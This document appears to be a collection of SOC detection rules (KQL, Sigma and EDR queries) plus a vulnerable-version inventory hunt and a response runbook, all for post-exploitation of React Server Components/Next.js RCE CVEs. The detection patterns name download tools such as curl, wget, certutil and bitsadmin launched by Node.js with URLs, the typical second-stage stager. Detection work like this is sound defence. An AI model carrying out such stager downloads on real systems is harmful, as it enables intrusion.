| where ActingProcessName has_any ("curl","wget","bitsadmin","certutil","powershell","pwsh","cmd.exe","bash","sh")
| where ActingProcessCommandLine has_any ("http://","https://","ftp://","tftp://")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ActingProcessId
| order by TimeGenerated desc
title: Next.js Node.js Spawns Download Utility (CVE-2025-66478 Post-Exploit)
id: 5d8c3b9e-4f1a-4e2b-bb53-1f7a9c6e2d11
description: Detects Node.js spawning curl/wget/bitsadmin/certutil/shell with a URL on the command line, a typical second-stage stager pattern after RCE via React Server Components / Next.js App Router (CVE-2025-55182, CVE-2025-66478).
references:
  - https://www.stepsecurity.io/blog/critical-remote-code-execution-vulnerabilities-discovered-in-react-server-components-and-next-js
author: SOC Detection Engineering
date: 2025/12/03
tags:
  - attack.execution
  - attack.t1059
  - attack.t1105
  - attack.t1190
logsource:
  category: process_creation
  product: windows
detection:
  parent:
    ParentImage|endswith:
      - '\node.exe'
  child_bins:
    Image|endswith:
      - '\curl.exe'
      - '\wget.exe'
      - '\bitsadmin.exe'
      - '\certutil.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\bash.exe'
      - '\sh.exe'
  url_args:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
      - 'tftp://'
  condition: parent and child_bins and url_args

  - Application-bundled installers/updaters launched by Node.js build tooling
  - Custom CI/CD post-build hooks running curl/wget under Node parent
level: high

source:windows.sysmon @EventID:1 @ParentImage:(*\node.exe OR *\NODE.EXE OR *\Node.exe) @Image:(*\curl.exe OR *\Curl.exe OR *\CURL.EXE OR *\wget.exe OR *\WGET.EXE OR *\bitsadmin.exe OR *\certutil.exe OR *\powershell.exe OR *\PowerShell.exe OR *\cmd.exe OR *\bash.exe OR *\sh.exe) @CommandLine:(*http\:* OR *https\:* OR *ftp\:* OR *tftp\:*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/node(\.exe)?$/i ImageFileName=/\\(curl|wget|bitsadmin|certutil|powershell|pwsh|cmd|bash|sh)\.exe$/i
| regex("https?://|ftp://|tftp://", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Vulnerable React Server Components or Next.js App Router versions present in inventory AIReconnaissance High
Inventory pivot using Defender TVM to surface every host or repo image carrying a vulnerable react-server-dom-* package or affected Next.js App Router build (CVE-2025-55182 / CVE-2025-66478). Drives the patch list before exploitation rather than after — 39% of cloud environments are reportedly affected per Wiz research cited in the article. Rationale: Article enumerates the exact vulnerable package names (`react-server-dom-parcel/webpack/turbopack` 19.0.0–19.2.0) and Next.js version bands — TVM lookup against those strings and the two CVE IDs gives a clean, deterministic asset list. Cross-checked CVE IDs against the React Core Team security advisory and Wiz blog cited in the article. Cross-checked against: • https://github.com/facebook/react/security/advisories • https://www.wiz.io/blog/critical-vulnerability-in-react • https://nvd.nist.gov/vuln/detail/CVE-2025-55182 • https://nvd.nist.gov/vuln/detail/CVE-2025-66478
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Containers carrying the vulnerable package but with the RSC code path disabled (not using App Router)
  • Dev-only hosts running canary builds that are never internet-exposed
  • Build artefacts cached on developer machines no longer in production rotation
  • Lockfile-pinned versions in archived repos that aren't deployed
Response runbook
Step 1 — Triage: Confirm the host or repo is actually serving traffic (cross-reference with reverse-proxy / load-balancer config); identify whether the affected runtime is internet-exposed (Wiz reports 44% of Next.js instances are). Pull `npm list react` and `npm list next` from the host. Step 2 — Contain: For internet-exposed hosts on vulnerable versions, restrict ingress at the WAF/CDN until patched. For non-exposed but vulnerable assets, schedule emergency change. Step 3 — Hunt: Pivot to the Node.js + curl/wget detection on the same host list, plus DeviceNetworkEvents for unusual egress from `node.exe`, to confirm no prior exploitation. Approve the StepSecurity NPM Cooldown exception for the patched versions per the advisory.

    DeviceTvmSoftwareInventory

         or (SoftwareName startswith "react-server-dom-" and SoftwareVersion has_any ("19.0.0","19.1.0","19.1.1","19.2.0"))
         or (SoftwareName == "next" and (SoftwareVersion startswith "14.3.0-canary." or SoftwareVersion startswith "15.0." or SoftwareVersion startswith "15.1." or SoftwareVersion startswith "15.2." or SoftwareVersion startswith "15.3." or SoftwareVersion startswith "15.4." or SoftwareVersion startswith "15.5." or SoftwareVersion startswith "16.0."))

)
| order by Timestamp desc
